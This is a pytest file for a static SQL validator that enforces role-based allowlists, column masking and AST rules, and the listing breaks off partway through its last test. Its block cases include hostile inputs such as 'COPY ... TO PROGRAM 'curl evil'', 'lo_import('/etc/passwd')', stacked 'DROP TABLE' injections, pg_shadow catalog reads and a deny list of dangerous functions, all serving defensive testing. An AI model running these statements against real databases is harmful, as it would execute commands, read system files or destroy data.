"""Tests for the static SQL validator: allowlist and ast_rules layers (offline, no database)."""
from __future__ import annotations

import pytest
import sqlglot

from app.guards.policy import Policy
from app.guards.sql_validator import validate_sql
from app.types import Decision

ALLOWLIST = "allowlist"
AST = "ast_rules"


# ----------------------------------------------------------------------------- helpers

def run(policy, role, sql, **kw):
    return validate_sql(sql, policy.role(role), policy, **kw)


def by_layer(outcome):
    return {r.layer: r for r in outcome.results}


def assert_block(policy, role, sql, layer, rule_id):
    """Run only the layer under test and assert the exact rule id; SQL must come back untouched."""
    kw = {"check_allowlist": layer == ALLOWLIST, "check_ast": layer == AST}
    out = run(policy, role, sql, **kw)
    assert len(out.results) == 1, out.results
    res = out.results[0]
    assert res.layer == layer
    assert res.decision == Decision.BLOCK, f"expected block, got allow for: {sql!r}"
    assert res.rule_id == rule_id, f"{res.rule_id}: {res.reason}"
    assert res.reason
    assert out.sql == sql
    assert out.blocked
    assert out.masked_outputs == {}


def assert_allow(policy, role, sql):
    out = run(policy, role, sql)
    assert [r.layer for r in out.results] == [ALLOWLIST, AST]
    for r in out.results:
        assert r.decision == Decision.ALLOW, f"{r.rule_id}: {r.reason} for {sql!r}"
    assert not out.blocked
    return out


# ----------------------------------------------------------------------------- allowlist: block cases

ALLOWLIST_BLOCKS = [
    # parse_error (fail closed)
    ("analyst", "SELEC id FROM orders", "allowlist.parse_error"),
    ("analyst", "", "allowlist.parse_error"),
    ("analyst", "   -- nothing", "allowlist.parse_error"),
    ("analyst", "DR/**/OP TABLE users", "allowlist.parse_error"),
    ("analyst", "SET x = 1", "allowlist.parse_error"),
    ("analyst", "DO $$ begin end $$", "allowlist.parse_error"),
    ("analyst", "CALL f()", "allowlist.parse_error"),
    ("analyst", "GRANT SELECT ON users TO x", "allowlist.parse_error"),
    ("analyst", "VACUUM", "allowlist.parse_error"),
    ("analyst", "LISTEN x", "allowlist.parse_error"),
    ("analyst", "EXPLAIN SELECT 1", "allowlist.parse_error"),
    ("analyst", "COPY users TO STDOUT", "allowlist.parse_error"),
    ("analyst", "COPY (SELECT id FROM orders) TO PROGRAM 'curl evil'", "allowlist.parse_error"),
    # table_denied
    ("analyst", "SELECT * FROM api_keys", "allowlist.table_denied"),
    ("admin", "SELECT id FROM api_keys", "allowlist.table_denied"),
    ("analyst", "DELETE FROM api_keys", "allowlist.table_denied"),
    ("analyst", "SELECT id FROM orders UNION SELECT id FROM api_keys", "allowlist.table_denied"),
    ("analyst", "SELECT (SELECT secret FROM api_keys LIMIT 1)", "allowlist.table_denied"),
    ("analyst", "SELECT 1 FROM pg_catalog.pg_user", "allowlist.table_denied"),
    ("analyst", "SELECT table_name FROM information_schema.columns", "allowlist.table_denied"),
    ("analyst", "SELECT id FROM sales.orders", "allowlist.table_denied"),
    ("analyst", "SELECT id FROM nosuchtable", "allowlist.table_denied"),
    ("analyst", 'SELECT id FROM "Orders"', "allowlist.table_denied"),
    ("analyst", "WITH c AS (SELECT id FROM api_keys) SELECT id FROM c", "allowlist.table_denied"),
    ("analyst", "SELECT id FROM orders WHERE id IN (SELECT id FROM api_keys)", "allowlist.table_denied"),
    # column_denied
    ("analyst", "SELECT ssn FROM users", "allowlist.column_denied"),
    ("analyst", 'SELECT "users"."ssn" FROM "users"', "allowlist.column_denied"),
    ("analyst", "SELECT public.users.ssn FROM public.users", "allowlist.column_denied"),
    ("analyst", "SELECT u.ssn FROM users AS u", "allowlist.column_denied"),
    ("analyst", "SELECT x FROM (SELECT ssn AS x FROM users) t", "allowlist.column_denied"),
    ("analyst", "WITH c AS (SELECT ssn FROM users) SELECT ssn FROM c", "allowlist.column_denied"),
    ("analyst", "WITH c AS (SELECT ssn FROM users) SELECT * FROM c", "allowlist.column_denied"),
    ("analyst", "SELECT id FROM users WHERE ssn = '1'", "allowlist.column_denied"),
    ("analyst", "SELECT id FROM users ORDER BY ssn", "allowlist.column_denied"),
    ("analyst", "SELECT city, count(*) FROM users GROUP BY city, ssn", "allowlist.column_denied"),
    ("analyst", "SELECT o.id FROM orders o JOIN users u ON u.id = o.user_id AND u.ssn = 'x'", "allowlist.column_denied"),
    ("analyst", "SELECT city FROM users GROUP BY city HAVING max(ssn) > 'a'", "allowlist.column_denied"),
    ("analyst", "SELECT o.id FROM orders o WHERE EXISTS (SELECT 1 FROM users u WHERE u.id = o.user_id AND u.ssn = 'x')", "allowlist.column_denied"),
    ("analyst", "SELECT o.id, (SELECT max(u.ssn) FROM users u WHERE u.id = o.user_id) FROM orders o", "allowlist.column_denied"),
    ("analyst", "SELECT id FROM orders UNION SELECT ssn FROM users", "allowlist.column_denied"),
    ("analyst", "SELECT password_hash FROM users", "allowlist.column_denied"),
    ("manager", "SELECT ssn FROM users", "allowlist.column_denied"),
    ("manager", "SELECT address FROM users", "allowlist.column_denied"),
    ("admin", "SELECT password_hash FROM users", "allowlist.column_denied"),
    ("analyst", "SELECT email FROM users WHERE city = 'x'", "allowlist.column_denied"),
    ("analyst", "UPDATE users SET city = 'x' WHERE ssn = '1'", "allowlist.column_denied"),
    # unresolved_column
    ("analyst", "SELECT users FROM users", "allowlist.unresolved_column"),
    ("analyst", "SELECT u FROM users u", "allowlist.unresolved_column"),
    ("analyst", "SELECT nosuch FROM orders", "allowlist.unresolved_column"),
    ("analyst", "SELECT orders.nosuch FROM orders", "allowlist.unresolved_column"),
    ("analyst", "SELECT id FROM orders, users", "allowlist.unresolved_column"),
    ("analyst", "SELECT x.id FROM orders", "allowlist.unresolved_column"),
    ("analyst", "SELECT other.orders.id FROM orders", "allowlist.unresolved_column"),
    # star_denied
    ("analyst", "SELECT * FROM users", "allowlist.star_denied"),
    ("analyst", "SELECT u.* FROM users u", "allowlist.star_denied"),
    ("analyst", "TABLE users", "allowlist.star_denied"),
    ("analyst", "SELECT * FROM orders o JOIN users u ON u.id = o.user_id", "allowlist.star_denied"),
    ("analyst", "SELECT o.id FROM orders o WHERE EXISTS (SELECT * FROM users u WHERE u.id = o.user_id)", "allowlist.star_denied"),
    ("manager", "SELECT * FROM users", "allowlist.star_denied"),
    ("admin", "SELECT * FROM users", "allowlist.star_denied"),
    # function_denied
    ("analyst", "SELECT pg_sleep(5)", "allowlist.function_denied"),
    ("analyst", "SELECT row_to_json(u) FROM users u", "allowlist.function_denied"),
    ("analyst", "SELECT to_json(users) FROM users", "allowlist.function_denied"),
    ("analyst", "SELECT current_setting('app.current_region')", "allowlist.function_denied"),
    ("analyst", "SELECT set_config('app.current_region', 'north', false)", "allowlist.function_denied"),
    ("analyst", "SELECT lo_import('/etc/passwd')", "allowlist.function_denied"),
    ("analyst", "SELECT pg_catalog.pg_sleep(1)", "allowlist.function_denied"),
    ("analyst", "SELECT * FROM generate_series(1, 100000000)", "allowlist.function_denied"),
    ("analyst", "SELECT * FROM unnest(ARRAY[1, 2])", "allowlist.function_denied"),
    ("analyst", "SELECT * FROM json_each('{}')", "allowlist.function_denied"),
    ("analyst", "SELECT current_user", "allowlist.function_denied"),
    ("analyst", "SELECT session_user", "allowlist.function_denied"),
    ("analyst", "SELECT current_role", "allowlist.function_denied"),
    ("analyst", "SELECT current_catalog", "allowlist.function_denied"),
    ("analyst", "SELECT current_schema", "allowlist.function_denied"),
    ("analyst", "SELECT id FROM orders WHERE status = current_user", "allowlist.function_denied"),
    # type_denied
    ("analyst", "SELECT status::regclass FROM orders", "allowlist.type_denied"),
    ("analyst", "SELECT CAST(status AS regproc) FROM orders", "allowlist.type_denied"),
    ("analyst", "SELECT id::oid FROM orders", "allowlist.type_denied"),
    ("analyst", "SELECT status::xml FROM orders", "allowlist.type_denied"),
    ("analyst", "SELECT status::json FROM orders", "allowlist.type_denied"),
    ("analyst", "SELECT status::bytea FROM orders", "allowlist.type_denied"),
    ("analyst", "SELECT status::text[] FROM orders", "allowlist.type_denied"),
    # masked_column_misuse
    ("manager", "SELECT lower(email) FROM users", "allowlist.masked_column_misuse"),
    ("manager", "SELECT substring(email, 1, 3) FROM users", "allowlist.masked_column_misuse"),
    ("manager", "SELECT email || 'x' FROM users", "allowlist.masked_column_misuse"),
    ("manager", "SELECT CASE WHEN email = 'a@b.c' THEN 1 ELSE 0 END FROM users", "allowlist.masked_column_misuse"),
    ("manager", "SELECT email::text FROM users", "allowlist.masked_column_misuse"),
    ("manager", "SELECT length(email) FROM users", "allowlist.masked_column_misuse"),
    ("manager", "SELECT full_name FROM users WHERE email = 'a@b.c'", "allowlist.masked_column_misuse"),
    ("manager", "SELECT full_name FROM users WHERE email LIKE 'a%'", "allowlist.masked_column_misuse"),
    ("manager", "SELECT full_name FROM users ORDER BY email", "allowlist.masked_column_misuse"),
    ("manager", "SELECT email FROM users ORDER BY email", "allowlist.masked_column_misuse"),
    ("manager", "SELECT email AS e FROM users ORDER BY e", "allowlist.masked_column_misuse"),
    ("manager", "SELECT email FROM users ORDER BY 1", "allowlist.masked_column_misuse"),
    ("manager", "SELECT email, count(*) FROM users GROUP BY email", "allowlist.masked_column_misuse"),
    ("manager", "SELECT email, count(*) FROM users GROUP BY 1", "allowlist.masked_column_misuse"),
    ("manager", "SELECT city, count(*) FROM users GROUP BY city HAVING max(email) > 'a'", "allowlist.masked_column_misuse"),
    ("manager", "SELECT o.id FROM orders o JOIN users u ON u.email = o.status", "allowlist.masked_column_misuse"),
    ("manager", "SELECT DISTINCT ON (email) id FROM users", "allowlist.masked_column_misuse"),
    ("manager", "SELECT row_number() OVER (PARTITION BY email) FROM users", "allowlist.masked_column_misuse"),
    ("manager", "SELECT row_number() OVER (ORDER BY email) FROM users", "allowlist.masked_column_misuse"),
    ("manager", "SELECT x FROM (SELECT email AS x FROM users) t", "allowlist.masked_column_misuse"),
    ("manager", "WITH c AS (SELECT email FROM users) SELECT email FROM c", "allowlist.masked_column_misuse"),
    ("manager", "SELECT id FROM users WHERE id IN (SELECT id FROM users WHERE phone LIKE '5%')", "allowlist.masked_column_misuse"),
    ("manager", "SELECT id FROM orders o WHERE EXISTS (SELECT 1 FROM users u WHERE u.id = o.user_id AND u.phone = '1')", "allowlist.masked_column_misuse"),
    ("manager", "SELECT (SELECT max(email) FROM users)", "allowlist.masked_column_misuse"),
    ("manager", "SELECT id FROM users UNION SELECT id FROM users WHERE email = 'a'", "allowlist.masked_column_misuse"),
    ("manager", "SELECT * FROM (SELECT * FROM users WHERE false) t", "allowlist.star_denied"),
    ("manager", "SELECT id, email FROM users UNION SELECT id, full_name FROM users ORDER BY email", "allowlist.masked_column_misuse"),
    ("manager", "SELECT id, email FROM users UNION SELECT id, full_name FROM users ORDER BY 2", "allowlist.masked_column_misuse"),
    ("admin", "SELECT lower(ssn) FROM users", "allowlist.masked_column_misuse"),
    ("admin", "SELECT id FROM users WHERE ssn = '1'", "allowlist.masked_column_misuse"),
    ("admin", "SELECT ssn FROM users ORDER BY ssn", "allowlist.masked_column_misuse"),
    ("admin", "SELECT ssn FROM employees GROUP BY ssn", "allowlist.masked_column_misuse"),
    ("admin", "SELECT card_number || '' FROM payments", "allowlist.masked_column_misuse"),
    ("admin", "SELECT * FROM (SELECT * FROM payments) t", "allowlist.masked_column_misuse"),
    ("admin", "SELECT count(DISTINCT ssn) FROM users", "allowlist.masked_column_misuse"),
    ("admin", "SELECT u.id FROM users u JOIN employees e ON e.ssn = u.ssn", "allowlist.masked_column_misuse"),
]

MASKED_FUNCTION_DENIED = [
    ("manager", "SELECT md5(email) FROM users"),
    ("admin", "SELECT md5(ssn) FROM users"),
    ("admin", "SELECT repeat(ssn, 2) FROM users"),
    ("admin", "SELECT encode(ssn::bytea, 'hex') FROM users"),
]


@pytest.mark.parametrize("role,sql,rule_id", ALLOWLIST_BLOCKS)
def test_allowlist_blocks(policy, role, sql, rule_id):
    assert_block(policy, role, sql, ALLOWLIST, rule_id)


@pytest.mark.parametrize("role,sql", MASKED_FUNCTION_DENIED)
def test_allowlist_blocks_masked_in_denied_function(policy, role, sql):
    out = run(policy, role, sql, check_ast=False)
    assert out.results[0].blocked
    assert out.results[0].rule_id in ("allowlist.function_denied", "allowlist.type_denied")


# ----------------------------------------------------------------------------- function allow/deny mapping

FUNCTION_SAMPLES = {
    "count": "count(id)", "sum": "sum(total_amount)", "avg": "avg(total_amount)",
    "min": "min(total_amount)", "max": "max(total_amount)", "stddev": "stddev(total_amount)",
    "stddev_samp": "stddev_samp(total_amount)", "stddev_pop": "stddev_pop(total_amount)",
    "variance": "variance(total_amount)", "bool_and": "bool_and(total_amount > 1)",
    "bool_or": "bool_or(total_amount > 1)", "string_agg": "string_agg(status, ',')",
    "array_agg": "array_agg(id)",
    "percentile_cont": "percentile_cont(0.5) WITHIN GROUP (ORDER BY total_amount)",
    "percentile_disc": "percentile_disc(0.5) WITHIN GROUP (ORDER BY total_amount)",
    "mode": "mode() WITHIN GROUP (ORDER BY status)",
    "row_number": "row_number() OVER (ORDER BY id)", "rank": "rank() OVER (ORDER BY id)",
    "dense_rank": "dense_rank() OVER (ORDER BY id)", "ntile": "ntile(4) OVER (ORDER BY id)",
    "lag": "lag(id) OVER (ORDER BY id)", "lead": "lead(id) OVER (ORDER BY id)",
    "first_value": "first_value(id) OVER (ORDER BY id)", "last_value": "last_value(id) OVER (ORDER BY id)",
    "nth_value": "nth_value(id, 2) OVER (ORDER BY id)", "percent_rank": "percent_rank() OVER (ORDER BY id)",
    "cume_dist": "cume_dist() OVER (ORDER BY id)",
    "coalesce": "coalesce(status, 'x')", "nullif": "nullif(status, 'x')", "greatest": "greatest(id, 2)",
    "least": "least(id, 2)", "lower": "lower(status)", "upper": "upper(status)", "initcap": "initcap(status)",
    "length": "length(status)", "char_length": "char_length(status)", "trim": "trim(status)",
    "ltrim": "ltrim(status)", "rtrim": "rtrim(status)", "btrim": "btrim(status)",
    "substring": "substring(status, 1, 2)", "substr": "substr(status, 1, 2)", "left": "left(status, 2)",
    "right": "right(status, 2)", "replace": "replace(status, 'a', 'b')", "concat": "concat(status, 'x')",
    "concat_ws": "concat_ws(',', status, 'x')", "position": "position('a' in status)",
    "strpos": "strpos(status, 'a')", "split_part": "split_part(status, ',', 1)",
    "round": "round(total_amount, 2)", "abs": "abs(total_amount)", "ceil": "ceil(total_amount)",
    "ceiling": "ceiling(total_amount)", "floor": "floor(total_amount)", "power": "power(total_amount, 2)",
    "sqrt": "sqrt(total_amount)", "mod": "mod(id, 2)", "sign": "sign(total_amount)", "ln": "ln(total_amount)",
    "log": "log(total_amount)", "exp": "exp(total_amount)", "cast": "cast(id as text)",
    "date_trunc": "date_trunc('month', order_date)", "date_part": "date_part('year', order_date)",
    "extract": "extract(year from order_date)", "age": "age(order_date)",
    "to_char": "to_char(order_date, 'YYYY-MM')", "to_date": "to_date(status, 'YYYY')", "now": "now()",
    "current_date": "current_date", "current_timestamp": "current_timestamp",
    "make_date": "make_date(2020, 1, 1)", "starts_with": "starts_with(status, 'a')",
}


def test_function_samples_cover_policy(policy):
    assert set(FUNCTION_SAMPLES) == set(policy.functions)


@pytest.mark.parametrize("name", sorted(FUNCTION_SAMPLES))
def test_allowlisted_functions_pass(policy, name):
    out = run(policy, "analyst", f"SELECT {FUNCTION_SAMPLES[name]} FROM orders", check_ast=False)
    assert out.results[0].decision == Decision.ALLOW, out.results[0].reason


DANGEROUS_FUNCTIONS = [
    "pg_sleep(1)", "pg_read_file('x')", "pg_ls_dir('.')", "lo_import('x')", "lo_export(1, 'x')",
    "dblink('a', 'b')", "set_config('a', 'b', false)", "current_setting('a')", "version()",
    "current_user", "session_user", "pg_backend_pid()", "generate_series(1, 2)", "repeat('a', 3)",
    "lpad(status, 5)", "rpad(status, 5)", "md5(status)", "sha256(status)", "encode(status, 'hex')",
    "decode(status, 'hex')", "convert_to(status, 'UTF8')", "to_hex(id)", "ascii(status)", "chr(65)",
    "translate(status, 'a', 'b')", "reverse(status)", "regexp_replace(status, 'a', 'b')",
    "regexp_matches(status, 'a')", "query_to_xml('select 1', true, true, '')", "pg_terminate_backend(1)",
    "pg_advisory_lock(1)", "txid_current()", "nextval('s')", "random()", "format('%s', status)",
    "quote_literal(status)", "string_to_array(status, ',')", "unnest(ARRAY[1])",
    "array_to_string(ARRAY[1], ',')", "json_agg(id)", "row_to_json(o)", "to_json(status)",
    "to_jsonb(status)", "jsonb_agg(id)", "xmlagg(status)", "hashtext(status)",
]


@pytest.mark.parametrize("expr", DANGEROUS_FUNCTIONS)
def test_dangerous_functions_denied(policy, expr):
    assert_block(policy, "analyst", f"SELECT {expr} FROM orders o", ALLOWLIST, "allowlist.function_denied")


def test_dangerous_function_allowed_when_listed(policy):
    import dataclasses

    wider = dataclasses.replace(policy, functions=policy.functions | {"lpad", "generate_series", "version", "random"})
    for expr in ("lpad(status, 5)", "version()", "random()"):
        out = validate_sql(f"SELECT {expr} FROM orders", wider.role("analyst"), wider, check_ast=False)
        assert not out.blocked, expr
    out = validate_sql("SELECT * FROM generate_series(1, 3)", wider.role("analyst"), wider, check_ast=False)
    assert not out.blocked


# ----------------------------------------------------------------------------- ast_rules: block cases

def _join_chain(n: int) -> str:
    sql = "SELECT t0.id FROM orders t0"
    for i in range(1, n + 1):
        sql += f" JOIN orders t{i} ON t{i}.id = t{i - 1}.id"
    return sql


AST_BLOCKS = [
    # parse errors / empty
    ("DR/**/OP TABLE users", "ast.parse_error"),
    ("SELEC 1", "ast.parse_error"),
    ("SELECT FROM WHERE", "ast.parse_error"),
    ("", "ast.empty"),
    ("   \n\t ", "ast.empty"),
    ("-- just a comment", "ast.empty"),
    ("/* c */ ;", "ast.empty"),
    # too long
    ("SELECT 1 -- " + "x" * 4100, "ast.too_long"),
    # multi statement
    ("SELECT 1; DROP TABLE users", "ast.multi_statement"),
    ("SELECT 1; SELECT 2", "ast.multi_statement"),
    ("select 1;select 2;", "ast.multi_statement"),
    ("SELECT id FROM orders; DELETE FROM orders", "ast.multi_statement"),
    # non select
    ("DROP TABLE users", "ast.non_select"),
    ("DeLeTe FROM orders", "ast.non_select"),
    ("DELETE FROM orders WHERE id = 1", "ast.non_select"),
    ("UPDATE orders SET status = 'x'", "ast.non_select"),
    ("INSERT INTO orders (id) VALUES (1)", "ast.non_select"),
    ("TRUNCATE orders", "ast.non_select"),
    ("CREATE TABLE x (a int)", "ast.non_select"),
    ("ALTER TABLE orders ADD COLUMN x int", "ast.non_select"),
    ("MERGE INTO t USING s ON t.a = s.a WHEN MATCHED THEN DELETE", "ast.non_select"),
    ("COPY users TO STDOUT", "ast.non_select"),
    ("COPY (SELECT id FROM orders) TO PROGRAM 'curl evil'", "ast.non_select"),
    ("SET statement_timeout = 0", "ast.non_select"),
    ("RESET ALL", "ast.non_select"),
    ("SHOW all", "ast.non_select"),
    ("CALL do_it()", "ast.non_select"),
    ("DO $$ begin perform 1; end $$", "ast.non_select"),
    ("EXPLAIN SELECT 1", "ast.non_select"),
    ("EXPLAIN ANALYZE DELETE FROM orders", "ast.non_select"),
    ("GRANT ALL ON orders TO public", "ast.non_select"),
    ("VACUUM", "ast.non_select"),
    ("ANALYZE orders", "ast.non_select"),
    ("LISTEN chan", "ast.non_select"),
    ("PREPARE p AS SELECT 1", "ast.non_select"),
    ("EXECUTE p", "ast.non_select"),
    ("BEGIN", "ast.non_select"),
    ("COMMIT", "ast.non_select"),
    ("LOCK TABLE orders", "ast.non_select"),
    ("VALUES (1), (2)", "ast.non_select"),
    ("WITH d AS (DELETE FROM orders RETURNING *) SELECT * FROM d", "ast.non_select"),
    ("WITH u AS (UPDATE orders SET status = 'x' RETURNING id) SELECT id FROM u", "ast.non_select"),
    ("WITH i AS (INSERT INTO orders (id) VALUES (1) RETURNING id) SELECT id FROM i", "ast.non_select"),
    # select into / locking
    ("SELECT id INTO newtable FROM orders", "ast.select_into"),
    ("SELECT * INTO TEMP t2 FROM orders", "ast.select_into"),
    ("SELECT id FROM orders FOR UPDATE", "ast.locking_clause"),
    ("SELECT id FROM orders FOR SHARE", "ast.locking_clause"),
    ("SELECT id FROM orders FOR NO KEY UPDATE", "ast.locking_clause"),
    ("SELECT id FROM orders FOR UPDATE SKIP LOCKED", "ast.locking_clause"),
    # system catalog
    ("SELECT usename FROM pg_catalog.pg_user", "ast.system_catalog"),
    ("SELECT * FROM information_schema.tables", "ast.system_catalog"),
    ("SELECT * FROM pg_tables", "ast.system_catalog"),
    ("SELECT * FROM pg_user", "ast.system_catalog"),
    ("SELECT * FROM other_schema.orders", "ast.system_catalog"),
    ('SELECT * FROM "pg_catalog"."pg_shadow"', "ast.system_catalog"),
    ("SELECT pg_catalog.pg_sleep(1)", "ast.system_catalog"),
    # recursive
    ("WITH RECURSIVE r AS (SELECT 1 AS n UNION ALL SELECT n + 1 FROM r) SELECT n FROM r", "ast.recursive_cte"),
    # cartesian joins
    ("SELECT a.id FROM orders a CROSS JOIN orders b", "ast.cartesian_join"),
    ("SELECT a.id FROM orders a, orders b", "ast.cartesian_join"),
    ("SELECT a.id FROM orders a JOIN orders b ON true", "ast.cartesian_join"),
    ("SELECT a.id FROM orders a JOIN orders b ON 1 = 1", "ast.cartesian_join"),
    ("SELECT a.id FROM orders a JOIN orders b ON a.id = 5", "ast.cartesian_join"),
    ("SELECT a.id FROM orders a JOIN orders b ON a.id = a.user_id", "ast.cartesian_join"),
    ("SELECT a.id FROM orders a, orders b WHERE a.id > b.id", "ast.cartesian_join"),
    ("SELECT a.id FROM orders a, orders b WHERE a.id = 3", "ast.cartesian_join"),
    ("SELECT a.id FROM orders a, orders b WHERE a.id = b.id OR a.id = 1 AND false", "ast.cartesian_join"),
    ("SELECT a.id FROM orders a JOIN orders b ON a.id = b.id CROSS JOIN products p", "ast.cartesian_join"),
    # complexity caps
    (_join_chain(7), "ast.too_many_joins"),
    ("SELECT (SELECT 1), (SELECT 2), (SELECT 3), (SELECT 4), (SELECT 5)", "ast.too_many_subqueries"),
    ("WITH a AS (SELECT 1 AS x), b AS (SELECT 2 AS x), c AS (SELECT 3 AS x), d AS (SELECT 4 AS x), "
     "e AS (SELECT 5 AS x) SELECT * FROM a", "ast.too_many_subqueries"),
    ("SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT 1 AS a) t1) t2) t3) t4",
     "ast.too_deep"),
    ("SELECT 1 UNION SELECT 2 UNION SELECT 3 UNION SELECT 4 UNION SELECT 5", "ast.too_many_set_ops"),
]


@pytest.mark.parametrize("sql,rule_id", AST_BLOCKS)
def test_ast_blocks(policy, sql, rule_id):
    assert_block(policy, "analyst", sql, AST, rule_id)


def test_ast_block_does_not_depend_on_role(policy):
    for role in ("analyst", "manager", "admin"):
        assert_block(policy, role, "SELECT 1; SELECT 2", AST, "ast.multi_statement")


# ----------------------------------------------------------------------------- allow cases (false-block traps)

ALLOW_ANALYST = [
    "SELECT id, status FROM orders",
    "SELECT 'DROP TABLE users; --' AS s, status FROM orders",
    "SELECT id FROM orders WHERE status = 'DELETE FROM orders; SELECT 1'",
    "SELECT id FROM orders WHERE status = 'it''s; fine'",
    "SELECT id /* DROP TABLE users */ FROM orders -- trailing comment",
    "-- leading comment\nSELECT id FROM orders",
    "SELECT status, deleted_at_note FROM (SELECT status, 'x' AS deleted_at_note FROM orders) t",
    "SELECT status AS \"select\", id AS \"from\" FROM orders",
    "WITH users AS (SELECT 1 AS id) SELECT id FROM users",
    "WITH orders AS (SELECT 1 AS id) SELECT id FROM orders",
    "WITH api_keys AS (SELECT 1 AS id) SELECT id FROM api_keys",
    "WITH c AS (SELECT id, status FROM orders) SELECT c.status, count(*) FROM c GROUP BY c.status",
    'SELECT "id", "status" FROM "orders"',
    "SELECT ID, Status FROM ORDERS",
    "SELECT O.Id FROM Orders AS O",
    "SELECT count(*) FROM orders",
    "SELECT count(DISTINCT user_id) FROM orders",
    "SELECT status, count(*) AS n FROM orders GROUP BY 1",
    "SELECT status, count(*) AS n FROM orders GROUP BY 1 ORDER BY n DESC",
    "SELECT status AS s FROM orders GROUP BY s ORDER BY s",
    "SELECT status, sum(total_amount) AS total FROM orders GROUP BY status HAVING sum(total_amount) > 100",
    "SELECT id, row_number() OVER (PARTITION BY region ORDER BY order_date) FROM orders",
    "SELECT id, sum(total_amount) OVER (PARTITION BY user_id) FROM orders",
    "SELECT a.id, b.id FROM orders a JOIN orders b ON a.user_id = b.user_id AND a.id < b.id",
    "SELECT id FROM orders WHERE order_date > now() - interval '30 days'",
    "SELECT id FROM orders WHERE order_date >= current_date - INTERVAL '1 month'",
    "SELECT total_amount::numeric FROM orders",
    "SELECT id::text, total_amount::numeric(10, 2), order_date::date, id::bigint, id::float8 FROM orders",
    "SELECT CASE WHEN total_amount > 100 THEN 'big' WHEN total_amount > 10 THEN 'mid' ELSE 'small' END FROM orders",
    "SELECT extract(year FROM order_date) AS y, count(*) FROM orders GROUP BY 1",
    "SELECT sum(total_amount) FILTER (WHERE status = 'delivered') FROM orders",
    "SELECT id FROM orders WHERE user_id IN (SELECT id FROM users WHERE city = 'x')",
    "SELECT id FROM orders o WHERE EXISTS (SELECT 1 FROM users u WHERE u.id = o.user_id)",
    "SELECT id FROM orders o WHERE NOT EXISTS (SELECT 1 FROM order_items i WHERE i.order_id = o.id)",
    "SELECT id FROM orders WHERE status IN ('a', 'b') AND total_amount BETWEEN 1 AND 2 AND status ILIKE 'a%' AND region IS NOT NULL",
    "SELECT date_trunc('month', order_date) AS m, sum(total_amount) FROM orders GROUP BY 1 ORDER BY 1",
    "SELECT id FROM orders;",
    "\n\n   SELECT id FROM orders\n",
    "select id from orders",
    "SELECT id FROM public.orders",
    "SELECT o.id, p.name FROM orders o JOIN order_items i ON i.order_id = o.id JOIN products p ON p.id = i.product_id",
    "SELECT o.id, u.city FROM orders o, users u WHERE o.user_id = u.id",
    "SELECT o.id FROM orders o JOIN order_items i USING (id)",
    "SELECT * FROM orders NATURAL JOIN order_items",
    "SELECT o.id FROM orders o LEFT JOIN users u ON u.id = o.user_id",
    "SELECT * FROM orders",
    "SELECT o.* FROM orders o",
    "SELECT * FROM (SELECT id, status FROM orders) t",
    "SELECT id FROM orders UNION ALL SELECT id FROM products",
    "(SELECT id FROM orders) UNION (SELECT id FROM products) ORDER BY id",
    "SELECT id FROM orders ORDER BY total_amount DESC NULLS LAST LIMIT 10",
    "SELECT id FROM orders LIMIT 10 OFFSET 20",
    "SELECT (SELECT max(total_amount) FROM orders) AS m",
    "SELECT product_id, string_agg(CAST(order_id AS text), ',') FROM order_items GROUP BY product_id",
    "SELECT percentile_cont(0.5) WITHIN GROUP (ORDER BY total_amount) FROM orders",
    "SELECT concat(status, '-', region), lower(status) || upper(region) FROM orders",
    "SELECT coalesce(sales_rep_id, 0) FROM orders",
    "SELECT id FROM orders WHERE status ~ '^a'",
    "SELECT count(*) FROM payments WHERE method = 'card'",
    "SELECT id, method FROM payments LIMIT 3",
    "SELECT city, count(*) FROM users GROUP BY city",
    "SELECT s.id FROM support_tickets s WHERE s.status = 'open'",
]


@pytest.mark.parametrize("sql", ALLOW_ANALYST)
def test_allow_cases_analyst(policy, sql):
    out = assert_allow(policy, "analyst", sql)
    assert out.parsed
    assert out.masked_outputs == {}
    assert " LIMIT " in out.sql.upper() or "FETCH" in out.sql.upper()
    # rewritten SQL must still parse as a single statement
    assert len(sqlglot.parse(out.sql, dialect="postgres")) == 1


def test_allow_info_in_details(policy):
    out = assert_allow(policy, "analyst", "SELECT id FROM orders")
    assert out.results[1].details == {"forced_limit": True, "limit": 1000}
    assert out.results[1].rule_id is None
    assert out.results[0].rule_id is None


# ----------------------------------------------------------------------------- masked outputs

MASKED_OUTPUT_CASES = [
    ("manager", "SELECT full_name, email FROM users", {1: "email"}),
    ("manager", "SELECT email FROM users", {0: "email"}),
    ("manager", "SELECT email AS e, phone FROM users", {0: "email", 1: "phone"}),
    ("manager", "SELECT u.email, u.full_name FROM users u", {0: "email"}),
    ("manager", "SELECT id, (email) FROM users", {1: "email"}),
    ("manager", "SELECT o.id, u.email FROM orders o JOIN users u ON u.id = o.user_id", {1: "email"}),
    ("manager", "SELECT email FROM users WHERE city = 'x' ORDER BY full_name LIMIT 5", {0: "email"}),
    ("manager", "SELECT id, email FROM users UNION ALL SELECT id, email FROM users", {1: "email"}),
    ("manager", "SELECT id, full_name FROM users", {}),
    ("manager", "SELECT * FROM support_tickets", {}),
    ("manager", "SELECT users.phone, users.email FROM users", {0: "phone", 1: "email"}),
    ("admin", "SELECT ssn FROM users", {0: "ssn"}),
    ("admin", "SELECT full_name, ssn FROM employees", {1: "ssn"}),
    ("admin", "SELECT * FROM payments", {3: "card"}),
    ("admin", "SELECT * FROM employees", {3: "ssn"}),
    ("admin", "SELECT p.* FROM payments p JOIN orders o ON o.id = p.order_id", {3: "card"}),
    ("admin", "SELECT o.id, p.* FROM orders o JOIN payments p ON o.id = p.order_id", {4: "card"}),
    ("admin", "SELECT card_number, card_last4 FROM payments", {0: "card"}),
    ("admin", "SELECT count(*) FROM users", {}),
]


@pytest.mark.parametrize("role,sql,expected", MASKED_OUTPUT_CASES)
def test_masked_outputs(policy, role, sql, expected):
    out = assert_allow(policy, role, sql)
    assert out.masked_outputs == expected


def test_masked_outputs_empty_without_allowlist(policy):
    out = run(policy, "manager", "SELECT full_name, email FROM users", check_allowlist=False)
    assert out.masked_outputs == {}
    assert [r.layer for r in out.results] == [AST]


def test_masked_outputs_only_on_allowlist_only(policy):
    out = run(policy, "manager", "SELECT full_name, email FROM users", check_ast=False)
    assert out.masked_outputs == {1: "email"}
    assert out.sql == "SELECT full_name, email FROM users"


# ----------------------------------------------------------------------------- layer toggles

def test_both_layers_off(policy):
    sql = "DROP TABLE   users ;;"
    out = run(policy, "analyst", sql, check_allowlist=False, check_ast=False)
    assert out.results == []
    assert out.sql == sql
    assert out.masked_outputs == {}
    assert not out.blocked


def test_allowlist_only_object_checks_every_statement(policy):
